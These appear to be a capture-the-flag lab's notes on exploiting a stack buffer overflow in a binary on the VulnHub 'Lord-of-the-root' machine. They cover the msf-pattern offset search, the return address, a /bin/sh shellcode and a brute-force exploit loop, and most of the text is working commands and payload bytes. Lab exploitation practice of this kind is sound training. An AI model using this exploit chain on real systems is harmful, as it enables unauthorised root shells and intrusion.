# BOF
1. Determine Buffer Size till EIP overflows with A
	- Via fuzzing
	- Buffer Size: 200
2.  Create msf-pattern
	```
	msf-pattern_create -l 200
	Pattern:
	run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
	```
3. Use `env`
	```
	env - gdb /SECRET/door3/file
	show env
	unset env LINES
	unset env COLUMNS
	show env
	```
4.  Determine Pattern Address & Return Address
	```
	# Determine Return Address 
	# Address must not have badChars
	i r # Look at ESP
	i r esp
	x/40x $esp
	
	# Determine Pattern Address 
	# Or you can just look at where program crashed <0xADDRESS in ?? ()>
	i r eip
	```
	- Pattern Address: `0x41376641`
	- Return Address: `0xbfb82e80`
		- Little Endian: `\x80\x2e\xb8\xbf`
5. Determine EIP offset
	```
	msf-pattern_offset -q 0x41376641
	```
	- EIP offset: 171
6. Ensure EIP offset
	```
	run  $(python -c 'print "A" * 171 + "B" * 4 + "C" * 200')
	```
7. Shellcode
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/bof]
	└─# cat shellcode | sed 's/"//g' | tr -d '\n'
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
	```
8. Exploit
	```
	for x in {1..1000}; do env - /SECRET/door3/file $(python -c 'print "A"*171 + "\x80\x2e\xb8\xbf" + "\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); done
	```
